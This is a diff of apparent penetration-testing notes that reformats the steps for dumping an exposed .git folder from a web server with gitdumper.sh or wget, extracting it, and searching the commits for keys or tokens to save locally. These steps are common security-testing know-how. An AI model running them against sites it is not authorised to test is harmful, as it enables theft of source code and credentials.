@@ -6,24 +6,40 @@
 
 ## STEPS:
 
-#### 1) gitdumper.sh http://WHATEVER/.git/ repo
+#### 1) 
+
+    gitdumper.sh http://WHATEVER/.git/ repo
 
 ## Alternate method: wget
 
- - wget -r http://DOMAIN.COM/.git
+    wget -r http://DOMAIN.COM/.git
 
 #### 2) Go to the directory where the .git folder is located
 
-#### 3) /path/to/extractor.sh . App
+#### 3) 
 
-#### 4) git log (Gets all commits in the repository)
+    /path/to/extractor.sh . App
 
-#### 5) git branch -a (Show all branches a repository has)
+#### 4) Gets all commits in the repository
 
-#### 6) git show COMMIT_NUMBER (See the specific commit in detail)
+    git log 
 
-#### 7) git checkout BRANCH (Switch to another branch)
+#### 5) Show all branches a repository has
 
-#### 8) git branch (Check in which branch are we now)
+    git branch -a 
 
-#### 9) git show COMMIT_NUMBER^:FILE.json > token.json (If we found a file/key/token, we can check the filename upon seeing the commit, then we store it locally with this command)
+#### 6) See the specific commit in detail
+
+    git show COMMIT_NUMBER 
+
+#### 7) Switch to another branch
+
+    git checkout BRANCH 
+
+#### 8) Check in which branch are we now
+
+    git branch 
+
+#### 9) If we found a file/key/token, we can check the filename upon seeing the commit, then we store it locally with this command
+
+    git show COMMIT_NUMBER^:FILE.json > token.json 
